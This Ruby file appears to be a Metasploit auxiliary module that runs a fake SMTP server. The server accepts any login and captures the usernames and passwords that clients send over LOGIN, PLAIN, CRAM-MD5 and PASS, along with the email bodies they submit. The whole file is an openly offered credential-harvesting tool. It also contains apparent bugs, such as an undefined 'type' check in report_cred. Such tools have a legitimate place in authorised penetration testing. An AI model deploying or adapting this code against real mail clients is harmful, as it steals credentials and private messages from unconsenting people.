##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::TcpServer
  include Msf::Auxiliary::Report


  def initialize
    super(
      'Name'        => 'Authentication Capture: SMTP',
      'Description'    => %q{
        This module provides a fake SMTP service that
      is designed to capture authentication credentials.
      },
      'Author'      => ['ddz', 'hdm', 'h00die'],
      'License'     => MSF_LICENSE,
      'Actions'     =>
        [
          [ 'Capture' ]
        ],
      'PassiveActions' =>
        [
          'Capture'
        ],
      'DefaultAction'  => 'Capture',
      'References' =>
        [
          ['URL', 'https://www.samlogic.net/articles/smtp-commands-reference-auth.htm']
        ],
    )

    register_options(
      [
        OptPort.new('SRVPORT',    [ true, "The local port to listen on.", 25 ])
      ])
  end

  def setup
    super
    @state = {}
  end

  def run
    exploit()
  end

  def auth_plain_parser(data)
    # this data is \00 delimited, and has 3 fields: un\00un\00\pass.  Not sure why a double username, but we drop the first one
    Rex::Text.decode_base64(data).split("\00").drop(1)
  end

  def on_client_connect(c)
    @state[c] = {:name => "#{c.peerhost}:#{c.peerport}", :ip => c.peerhost, :port => c.peerport, :user => nil, :pass => nil}
    c.put "220 SMTP Server Ready\r\n"
  end

  def on_client_data(c)
    data = c.get_once
    return if not data

    print_status("SMTP: #{@state[c][:name]} Command: #{data.strip}")

    if(@state[c][:data_mode])

      @state[c][:data_buff] ||= ''
      @state[c][:data_buff] += data

      idx = @state[c][:data_buff].index("\r\n.\r\n")
      if(idx)
        report_note(
          :host => @state[c][:ip],
          :type => "smtp_message",
          :data => @state[c][:data_buff][0,idx]
        )
        @state[c][:data_buff][0,idx].split("\n").each do |line|
          print_status("SMTP: #{@state[c][:name]} EMAIL: #{line.strip}")
        end

        @state[c][:data_buff] = nil
        @state[c][:data_mode] = nil
        c.put "250 OK\r\n"
      end

      return
    end

    if(@state[c][:auth_login])
      if @state[c][:user].nil?
        @state[c][:user] = Rex::Text.decode_base64(data)
        c.put "334 #{Rex::Text.encode_base64('Password')}\r\n"
        return
      end
      @state[c][:pass] = Rex::Text.decode_base64(data)
      print_good("SMTP LOGIN #{@state[c][:name]} #{@state[c][:user]} / #{@state[c][:pass]}")
      report_cred(
        ip: @state[c][:ip],
        port: datastore['SRVPORT'],
        service_name: 'smtp',
        user: @state[c][:user],
        password: @state[c][:pass],
        proof: data # will be base64 encoded, but its proof...
      )
      @state[c][:auth_login] = nil
      c.put "235 2.7.0 Authentication successful\r\n"
      return
    end

    if(@state[c][:auth_plain])
      # this data is \00 delimited, and has 3 fields: un\00un\00\pass.  Not sure why a double username
      un_pass = auth_plain_parser data

      @state[c][:user] = un_pass.first
      @state[c][:pass] = un_pass.last
      print_good("SMTP LOGIN #{@state[c][:name]} #{@state[c][:user]} / #{@state[c][:pass]}")
      report_cred(
        ip: @state[c][:ip],
        port: datastore['SRVPORT'],
        service_name: 'smtp',
        user: @state[c][:user],
        password: @state[c][:pass],
        proof: data # will be base64 encoded, but its proof...
      )
      @state[c][:auth_plain] = nil
      c.put "235 2.7.0 Authentication successful\r\n"
      return
    end

    if(@state[c][:auth_cram])
      #data is <username><space><digest aka hash>
      decoded = Rex::Text.decode_base64(data).split(' ')
      @state[c][:user] = decoded.first
      # challenge # response
      @state[c][:pass] = "#{@state[c][:auth_cram_challenge]}##{decoded.last}"
      report_cred(
        ip: @state[c][:ip],
        port: datastore['SRVPORT'],
        service_name: 'smtp',
        user: @state[c][:user],
        password: @state[c][:pass],
        proof: data, # will be base64 encoded, but its proof...
        type: 'cram'
      )
      c.put "235 2.7.0 Authentication successful\r\n"
      print_good("SMTP LOGIN #{@state[c][:name]} #{@state[c][:user]} / #{@state[c][:pass]}")
      @state[c][:auth_cram_challenge] = nil
      @state[c][:auth_cram] = nil
      return
    end


    cmd,arg = data.strip.split(/\s+/, 2)
    arg ||= ""

    case cmd.upcase
    when 'HELO', 'EHLO'
      c.put "250 OK\r\n"
      return

    when 'MAIL'
      x,from = data.strip.split(":", 2)
      @state[c][:from] = from.strip
      c.put "250 OK\r\n"
      return

    when 'RCPT'
      x,targ = data.strip.split(":", 2)
      @state[c][:rcpt] = targ.strip
      c.put "250 OK\r\n"
      return

    when 'DATA'
      @state[c][:data_mode] = true
      c.put "500 Error\r\n"
      return

    when 'QUIT'
      c.put "221 OK\r\n"
      return

    when 'PASS'

      @state[c][:pass] = arg

      report_cred(
        ip: @state[c][:ip],
        port: datastore['SRVPORT'],
        service_name: 'pop3',
        user: @state[c][:user],
        password: @state[c][:pass],
        proof: arg
      )
      print_good("SMTP LOGIN #{@state[c][:name]} #{@state[c][:user]} / #{@state[c][:pass]}")
      return

    when 'AUTH'
      if arg == 'LOGIN'
        @state[c][:auth_login] = true
        c.put "334 #{Rex::Text.encode_base64('Username')}\r\n"
        return
      elsif arg.split(' ').first == 'PLAIN'
        if arg.include? ' ' # the creds are passed as well
          un_pass = auth_plain_parser arg.split(' ').last

          @state[c][:user] = un_pass.first
          @state[c][:pass] = un_pass.last
          print_good("SMTP LOGIN #{@state[c][:name]} #{@state[c][:user]} / #{@state[c][:pass]}")
          report_cred(
            ip: @state[c][:ip],
            port: datastore['SRVPORT'],
            service_name: 'smtp',
            user: @state[c][:user],
            password: @state[c][:pass],
            proof: data # will be base64 encoded, but its proof...
          )
          c.put "235 2.7.0 Authentication successful\r\n"
          return
        end
        @state[c][:auth_plain] = true
        c.put "334\r\n"
        return
      elsif arg == 'CRAM-MD5'
        # create and send challenge
        challenge = Rex::Text.encode_base64("<12345@#{datastore['SRVHOST']}>")
        c.put "334 #{challenge}\r\n"
        @state[c][:auth_cram] = true
        @state[c][:auth_cram_challenge] = "<12345@#{datastore['SRVHOST']}>"
        return
      end
      # some other auth we dont understand
      vprint_error("Unknown authentication type string: #{arg}")
      c.put "503 Server Error\r\n"
    else
      vprint_error("Unknown command: #{arg}")
    end
    c.put "503 Server Error\r\n"
  
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }
    if type == 'cram'
      credential_data = {
        origin_type: :service,
        module_fullname: fullname,
        username: opts[:user],
        private_data: opts[:password],
        private_type: :nonreplayable_hash,
        jtr_format: 'hmac-md5'
      }.merge(service_data)
    else
      credential_data = {
        origin_type: :service,
        module_fullname: fullname,
        username: opts[:user],
        private_data: opts[:password],
        private_type: :password
      }.merge(service_data)
    end

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def on_client_close(c)
    @state.delete(c)
  end


end
